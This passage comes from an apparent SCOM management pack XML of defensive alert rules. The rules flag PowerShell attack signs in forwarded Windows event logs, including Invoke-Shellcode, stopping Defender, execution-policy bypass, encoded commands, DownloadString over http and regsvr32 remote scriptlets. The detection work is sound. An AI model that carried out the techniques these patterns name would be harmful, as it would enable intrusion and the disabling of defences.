                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-Portscan</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokePortScan.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-Shellcode</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.KillWindowsDefender" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>MsMpEng</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Stop</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>kill</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.KillWindowsDefender.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.CollectLAPSEvents" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4662</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventPublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">AdmPwd</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>-ExecutionPolicy</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>Program Files\Microsoft Monitoring Agent\Agent\Health Service State</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>UnRestricted</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Bypass</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <And>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Start-Process</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-WindowStyle Hidden</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeRemoteExpression" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>DownloadString</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>http</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>https</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeRemoteExpression.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeEncodedCommand" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-Enc</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-EncodedCommand</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeEncodedCommand.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>Program Files\Microsoft Monitoring Agent\Agent\Health Service State</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-nop</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-noprofile</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.RemoteRegSvr32" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>/i:http://</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>/i:https://</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.RemoteRegSvr32.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.FindAVSignature" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Find-AVSignature</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.FindAVSignature.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.GetDLLLoadPath" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-DllLoadPath</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.GetDLLLoadPath.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.GetHTTPStatus" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-HttpStatus</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
